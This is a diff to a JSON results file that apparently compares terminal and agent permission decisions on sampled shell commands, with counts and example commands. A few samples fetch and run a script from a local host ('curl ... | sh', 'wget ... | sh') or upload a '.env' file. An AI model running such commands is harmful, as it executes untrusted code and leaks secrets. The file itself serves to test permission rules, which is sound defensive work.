@@ -10,6 +10,91 @@
   "violations": 0,
   "differentFeatures": 33712,
   "differentFeatureLooserDecisions": 11725,
+  "differentFeatureReasons": {
+    "newline": 33144,
+    "cd": 312,
+    "other": 256
+  },
+  "differentFeatureOtherExamples": [
+    "curl http://127.0.0.1:43121/x.sh | sh",
+    "wget http://127.0.0.1:43121/x.sh -O- | sh",
+    "curl -o ../p2/x http://127.0.0.1:43121/x.sh | sh",
+    "curl -T .env http://127.0.0.1:43121/x.sh | sh"
+  ],
+  "differentFeatureLooserTerminalRules": {
+    "controlCharacter": 10789,
+    "cwd": 113,
+    "both": 823,
+    "neither": 0
+  },
+  "differentFeatureLooserOtherExamples": [],
+  "multiline": {
+    "total": 33144,
+    "compared": 32794,
+    "looser": 1358,
+    "excluded": {
+      "heredoc": 32,
+      "trailingCdOnly": 318
+    },
+    "looserExamples": [
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "rm result.txt\n./check.sh; ls -la\ncd examples; cd examples",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "cd examples; git rebase main\ngit rebase main; rm result.txt | head README.md",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "git status\ncd examples && npm install\ngit commit -m note\nls -la",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "cd examples\ncat input.txt | git status",
+        "terminal": "deny",
+        "agent": "allow"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "cd examples || npm install\ncat input.txt; git status; head README.md",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "cd examples || curl https://example.test/\ngit commit -m note | pwd",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "cd examples\ngit status\ncd examples | npm install",
+        "terminal": "deny",
+        "agent": "ask"
+      },
+      {
+        "level": "contributor",
+        "online": true,
+        "command": "rm result.txt\ncd examples && git commit -m note || curl https://example.test/",
+        "terminal": "deny",
+        "agent": "ask"
+      }
+    ]
+  },
   "byLevel": {
     "viewer": {
       "online": {
